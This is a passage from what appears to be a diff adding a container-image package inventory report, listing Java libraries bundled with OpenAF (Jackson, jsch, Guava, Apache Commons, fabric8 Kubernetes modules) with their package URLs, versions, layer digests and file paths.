+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.fasterxml.jackson.datatype/jackson-datatype-
+      │                 │       │            │       jsr310@2.20.0 
+      │                 │       │            ╰ UID : d55714c89e63442b 
+      │                 │       ├ Version   : 2.20.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/jackson-datatype-jsr310-2.20.0.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [7]   ╭ Name      : com.github.mwiede:jsch 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.github.mwiede/jsch@2.28.0 
+      │                 │       │            ╰ UID : 98eb7bafeacbc106 
+      │                 │       ├ Version   : 2.28.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [8]   ╭ Name      : com.github.vertical-blank:sql-formatter 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.github.vertical-blank/sql-formatter@2.0.5 
+      │                 │       │            ╰ UID : b476ea318a48e65d 
+      │                 │       ├ Version   : 2.0.5 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [9]   ╭ Name      : com.google.code.gson:gson 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.code.gson/gson@2.13.2 
+      │                 │       │            ╰ UID : 55058bf256f684f6 
+      │                 │       ├ Version   : 2.13.2 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [10]  ╭ Name      : com.google.errorprone:error_prone_annotations 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.errorprone/error_prone_annotations@2.
+      │                 │       │            │       41.0 
+      │                 │       │            ╰ UID : eb9200afd679f03a 
+      │                 │       ├ Version   : 2.41.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/error_prone_annotations-2.41.0.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [11]  ╭ Name      : com.google.guava:failureaccess 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/failureaccess@1.0.3 
+      │                 │       │            ╰ UID : a4d08553078f3494 
+      │                 │       ├ Version   : 1.0.3 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/failureaccess-1.0.3.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [12]  ╭ Name      : com.google.guava:guava 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/guava@33.5.0-jre 
+      │                 │       │            ╰ UID : 1c289ba755aff307 
+      │                 │       ├ Version   : 33.5.0-jre 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/guava-33.5.0-jre.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [13]  ╭ Name      : com.google.guava:listenablefuture 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.guava/listenablefuture@9999.0-empty-t
+      │                 │       │            │       o-avoid-conflict-with-guava 
+      │                 │       │            ╰ UID : dea9132e00506d46 
+      │                 │       ├ Version   : 9999.0-empty-to-avoid-conflict-with-guava 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/listenablefuture-9999.0-empty-to-avoid-conflict-with-gu
+      │                 │       │             ava.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [14]  ╭ Name      : com.google.j2objc:j2objc-annotations 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.google.j2objc/j2objc-annotations@3.1 
+      │                 │       │            ╰ UID : 33e5dd761cf08520 
+      │                 │       ├ Version   : 3.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/S3/j2objc-annotations-3.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [15]  ╭ Name      : com.googlecode.juniversalchardet:juniversalchardet 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.googlecode.juniversalchardet/juniversalchard
+      │                 │       │            │       et@1.0.3 
+      │                 │       │            ╰ UID : 5447189855b6db87 
+      │                 │       ├ Version   : 1.0.3 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [16]  ╭ Name      : com.jcraft:jsch.agentproxy.connector-factory 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.connector-factory@0.0.9 
+      │                 │       │            ╰ UID : a99fffa9ec19f7cf 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [17]  ╭ Name      : com.jcraft:jsch.agentproxy.core 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.core@0.0.9 
+      │                 │       │            ╰ UID : afb96fc5c6b4a255 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [18]  ╭ Name      : com.jcraft:jsch.agentproxy.jsch 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.jsch@0.0.9 
+      │                 │       │            ╰ UID : 8066e61c44eb14ea 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [19]  ╭ Name      : com.jcraft:jsch.agentproxy.pageant 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.pageant@0.0.9 
+      │                 │       │            ╰ UID : c0284278b99b17bc 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [20]  ╭ Name      : com.jcraft:jsch.agentproxy.sshagent 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.sshagent@0.0.9 
+      │                 │       │            ╰ UID : bd9e5fa40773f9dc 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [21]  ╭ Name      : com.jcraft:jsch.agentproxy.svnkit-trilead-ssh2 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.svnkit-trilead-ssh2@0
+      │                 │       │            │       .0.9 
+      │                 │       │            ╰ UID : 4bc35c3b9b6add62 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [22]  ╭ Name      : com.jcraft:jsch.agentproxy.usocket-jna 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.usocket-jna@0.0.9 
+      │                 │       │            ╰ UID : c30290a3390d8666 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [23]  ╭ Name      : com.jcraft:jsch.agentproxy.usocket-nc 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.jcraft/jsch.agentproxy.usocket-nc@0.0.9 
+      │                 │       │            ╰ UID : 48390e4cf4a3666a 
+      │                 │       ├ Version   : 0.0.9 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [24]  ╭ Name      : com.sun.activation:javax.activation 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.sun.activation/javax.activation@1.2.0 
+      │                 │       │            ╰ UID : 76398eb1d6d13adc 
+      │                 │       ├ Version   : 1.2.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [25]  ╭ Name      : com.sun.mail:javax.mail 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.sun.mail/javax.mail@1.6.2 
+      │                 │       │            ╰ UID : 1e7beb37baabc57a 
+      │                 │       ├ Version   : 1.6.2 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [26]  ╭ Name      : com.warrenstrange:googleauth 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/com.warrenstrange/googleauth@1.5.0 
+      │                 │       │            ╰ UID : 99ee628fb0243c8d 
+      │                 │       ├ Version   : 1.5.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [27]  ╭ Name      : commons-cli:commons-cli 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-cli/commons-cli@1.11.0 
+      │                 │       │            ╰ UID : 3475d2ee4b04dbe0 
+      │                 │       ├ Version   : 1.11.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [28]  ╭ Name      : commons-codec:commons-codec 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-codec/commons-codec@1.21.0 
+      │                 │       │            ╰ UID : 2426b259c63a1b24 
+      │                 │       ├ Version   : 1.21.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [29]  ╭ Name      : commons-io:commons-io 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-io/commons-io@2.21.0 
+      │                 │       │            ╰ UID : 2061cef217097cbb 
+      │                 │       ├ Version   : 2.21.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [30]  ╭ Name      : commons-logging:commons-logging 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-logging/commons-logging@1.3.6 
+      │                 │       │            ╰ UID : 2ad3f2cbc57ed9d5 
+      │                 │       ├ Version   : 1.3.6 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [31]  ╭ Name      : commons-net:commons-net 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/commons-net/commons-net@3.12.0 
+      │                 │       │            ╰ UID : f30479acbb8d626f 
+      │                 │       ├ Version   : 3.12.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [32]  ╭ Name      : de.vandermeer:asciilist-j7 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/de.vandermeer/asciilist-j7@1.0.0 
+      │                 │       │            ╰ UID : 5d38f221ce7d2a1 
+      │                 │       ├ Version   : 1.0.0 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [33]  ╭ Name      : de.vandermeer:asciitable-j7 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/de.vandermeer/asciitable-j7@1.0.1 
+      │                 │       │            ╰ UID : 4ec0aaacbd72cc14 
+      │                 │       ├ Version   : 1.0.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [34]  ╭ Name      : dnsjava:dnsjava 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/dnsjava/dnsjava@3.6.4 
+      │                 │       │            ╰ UID : 7aac8b1c2f9d99a1 
+      │                 │       ├ Version   : 3.6.4 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/openaf.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [35]  ╭ Name      : io.fabric8:kubernetes-client 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-client@7.6.1 
+      │                 │       │            ╰ UID : 7a1af2167e01c22a 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-client-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [36]  ╭ Name      : io.fabric8:kubernetes-client-api 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-client-api@7.6.1 
+      │                 │       │            ╰ UID : 468622c9bc901899 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-client-api-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [37]  ╭ Name      : io.fabric8:kubernetes-httpclient-vertx 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-httpclient-vertx@7.6.1 
+      │                 │       │            ╰ UID : 11eccf3c064d4ac7 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-httpclient-vertx-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [38]  ╭ Name      : io.fabric8:kubernetes-model-admissionregistration 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-admissionregistratio
+      │                 │       │            │       n@7.6.1 
+      │                 │       │            ╰ UID : 258f11a1ddbbeb52 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-admissionregistration-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [39]  ╭ Name      : io.fabric8:kubernetes-model-apiextensions 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-apiextensions@7.6.1 
+      │                 │       │            ╰ UID : d94960c2c0f9ad90 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-apiextensions-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [40]  ╭ Name      : io.fabric8:kubernetes-model-apps 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-apps@7.6.1 
+      │                 │       │            ╰ UID : 4a742b22335668fa 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-apps-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [41]  ╭ Name      : io.fabric8:kubernetes-model-autoscaling 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-autoscaling@7.6.1 
+      │                 │       │            ╰ UID : 1bcdf924b2ec1259 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-autoscaling-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [42]  ╭ Name      : io.fabric8:kubernetes-model-batch 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-batch@7.6.1 
+      │                 │       │            ╰ UID : e2cb3349c5c65795 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-batch-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [43]  ╭ Name      : io.fabric8:kubernetes-model-certificates 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-certificates@7.6.1 
+      │                 │       │            ╰ UID : 98ce726d4a3489fe 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-certificates-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [44]  ╭ Name      : io.fabric8:kubernetes-model-common 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-common@7.6.1 
+      │                 │       │            ╰ UID : 62c70b9ec22d2053 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-common-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [45]  ╭ Name      : io.fabric8:kubernetes-model-coordination 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-coordination@7.6.1 
+      │                 │       │            ╰ UID : ca7b596b77bf081c 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-coordination-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [46]  ╭ Name      : io.fabric8:kubernetes-model-core 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-core@7.6.1 
+      │                 │       │            ╰ UID : b5c91f9a79562117 
+      │                 │       ├ Version   : 7.6.1 
+      │                 │       ├ Layer      ╭ Digest: sha256:aa00abdff6ef097af329b677bba45f31977d98b1ceaab0929
+      │                 │       │            │         3113b8395f0ceaa 
+      │                 │       │            ╰ DiffID: sha256:05d72f1999a7023c8b60648816bbb360d1fd5480dda4e54eb
+      │                 │       │                      f30433b93da5788 
+      │                 │       ├ FilePath  : openaf/Kube/kubernetes-model-core-7.6.1.jar 
+      │                 │       ╰ AnalyzedBy: jar 
+      │                 ├ [47]  ╭ Name      : io.fabric8:kubernetes-model-discovery 
+      │                 │       ├ Identifier ╭ PURL: pkg:maven/io.fabric8/kubernetes-model-discovery@7.6.1 
+      │                 │       │            ╰ UID : 20ae8e9fdba15d 
+      │                 │       ├ Version   : 7.6.1 
